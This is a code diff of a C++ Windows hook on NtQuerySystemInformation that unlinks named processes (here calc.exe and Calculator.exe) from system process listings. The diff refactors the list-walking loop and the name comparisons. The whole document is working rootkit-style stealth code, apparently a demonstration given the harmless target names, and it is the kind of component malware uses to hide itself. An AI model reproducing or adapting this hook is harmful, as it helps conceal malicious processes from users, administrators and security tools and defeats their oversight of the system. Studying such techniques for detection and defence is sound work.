@@ -3,12 +3,44 @@
 
 //////////////////////////////////////////////////////////////////////////
 // Defines and typedefs
+// Macros available in kernel mode which are not available in user mode
 
-// Missing values _SYSTEM_INFORMATION_CLASS enum from <winternl.h>
-enum class MissingInfoClassIds
+#define RTL_CONSTANT_STRING(s) \
+{ \
+    sizeof( s ) - sizeof( (s)[0] ), \
+    sizeof( s ) / sizeof((s)), \
+    (s) \
+}
+
+#ifndef Add2Ptr
+#define Add2Ptr(P,I) ((PVOID)((PUCHAR)(P) + (I)))
+#endif
+
+//////////////////////////////////////////////////////////////////////////
+// Forward declaration of ntdll function
+
+extern "C" NTSYSAPI BOOLEAN RtlEqualUnicodeString(
+    PCUNICODE_STRING String1,
+    PCUNICODE_STRING String2,
+    BOOLEAN          CaseInSensitive
+);
+
+//////////////////////////////////////////////////////////////////////////
+// Values _SYSTEM_INFORMATION_CLASS enum from <winternl.h>
+
+enum class SystemInformationClass
 {
+    SystemProcessInformation = 0x5,
     SystemExtendedProcessInformationID = 0x39,
     SystemFullProcessInformationID = 0x94
+};
+
+//////////////////////////////////////////////////////////////////////////
+// array of process names to hide
+static const UNICODE_STRING hiddenProcessNames[] =
+{
+	RTL_CONSTANT_STRING(L"calc.exe"),
+	RTL_CONSTANT_STRING(L"Calculator.exe")
 };
 
 //////////////////////////////////////////////////////////////////////////
@@ -21,52 +53,47 @@ auto OriginalNtQuerySystemInformation = reinterpret_cast<decltype(NtQuerySystemI
 // Hooked function
 
 NTSTATUS WINAPI HookedNtQuerySystemInformation(
-    __in       SYSTEM_INFORMATION_CLASS SystemInformationClass,
-    __inout    PVOID                    SystemInformation,
-    __in       ULONG                    SystemInformationLength,
-    __out_opt  PULONG                   ReturnLength
+    __in       SYSTEM_INFORMATION_CLASS systemInformationClass,
+    __inout    PVOID                    systemInformation,
+    __in       ULONG                    systemInformationLength,
+    __out_opt  PULONG                   returnLength
     )
 {
-    NTSTATUS status = OriginalNtQuerySystemInformation(SystemInformationClass,
-        SystemInformation,
-        SystemInformationLength,
-        ReturnLength);
+    NTSTATUS status = OriginalNtQuerySystemInformation(systemInformationClass,
+        systemInformation,
+        systemInformationLength,
+        returnLength);
 
     if (!NT_SUCCESS(status))
     {
         return status;
     }
 
-    switch (SystemInformationClass)
+    switch (systemInformationClass)
     {
-        case SystemProcessInformation:
-        case MissingInfoClassIds::SystemExtendedProcessInformationID:
-        case MissingInfoClassIds::SystemFullProcessInformationID:
-        {
-            // Loop through the list of processes
-            PSYSTEM_PROCESS_INFORMATION pCurrent = nullptr;
-            PSYSTEM_PROCESS_INFORMATION pNext = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(SystemInformation);
+        case SystemInformationClass::SystemProcessInformation:
+        case SystemInformationClass::SystemExtendedProcessInformationID:
+        case SystemInformationClass::SystemFullProcessInformationID:
+		{
 
-            do
+			// Loop through the list of processes
+            for (PSYSTEM_PROCESS_INFORMATION  pCurrent = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(systemInformation),
+                pNext = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(Add2Ptr(pCurrent, pCurrent->NextEntryOffset))
+                ;
+                pNext != nullptr
+                ; 
+                pCurrent = pNext,
+                pNext = pCurrent->NextEntryOffset ? reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(Add2Ptr(pCurrent, pCurrent->NextEntryOffset)) : nullptr
+            )
             {
-                pCurrent = pNext;
-                pNext = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(reinterpret_cast<PUCHAR>(pCurrent) + pCurrent->NextEntryOffset);
-
-                if (0 == wcsncmp(pNext->ImageName.Buffer, L"calc.exe", pNext->ImageName.Length)
-                    || 0 == wcsncmp(pNext->ImageName.Buffer, L"Calculator.exe", pNext->ImageName.Length))
+                if (RtlEqualUnicodeString(&pNext->ImageName, &hiddenProcessNames[0], TRUE)
+                    || RtlEqualUnicodeString(&pNext->ImageName, &hiddenProcessNames[1], TRUE)
+				)
                 {
-                    if (0 == pNext->NextEntryOffset)
-                    {
-                        pCurrent->NextEntryOffset = 0;
-                    }
-                    else
-                    {
-                        pCurrent->NextEntryOffset += pNext->NextEntryOffset;
-                    }
-
+                    pCurrent->NextEntryOffset =  (0 == pNext->NextEntryOffset) ? 0 : pCurrent->NextEntryOffset + pNext->NextEntryOffset;
                     pNext = pCurrent;
                 }
-            } while (pCurrent->NextEntryOffset != 0);
+            }
             break;
         }
         default:
